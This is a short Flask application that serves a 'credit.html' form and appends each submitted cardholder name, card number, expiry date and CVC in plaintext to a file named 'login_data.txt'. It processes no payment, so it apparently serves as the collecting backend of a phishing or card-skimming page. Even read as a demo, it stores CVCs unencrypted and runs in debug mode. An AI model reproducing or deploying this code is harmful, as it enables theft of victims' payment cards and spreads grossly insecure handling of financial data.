from flask import Flask, render_template, request, redirect, url_for
import os

app = Flask(__name__)

SAVE_FILE = "login_data.txt"

@app.route("/")
def index():
    return render_template("credit.html")

@app.route("/save_card", methods=["POST"])
def save_card():
    card_name = request.form.get("cardName")
    card_number = request.form.get("cardNumber")
    exp = request.form.get("exp")
    cvc = request.form.get("cvc")

    if not all([card_name, card_number, exp, cvc]):
        return "All fields are required!", 400

    with open(SAVE_FILE, "a", encoding="utf-8") as f:
        f.write(f"Name: {card_name}\n")
        f.write(f"Number: {card_number}\n")
        f.write(f"Expiry: {exp}\n")
        f.write(f"CVC: {cvc}\n")
        f.write("-" * 40 + "\n")

    return redirect(url_for("index"))

if __name__ == "__main__":
    app.run(debug=True)

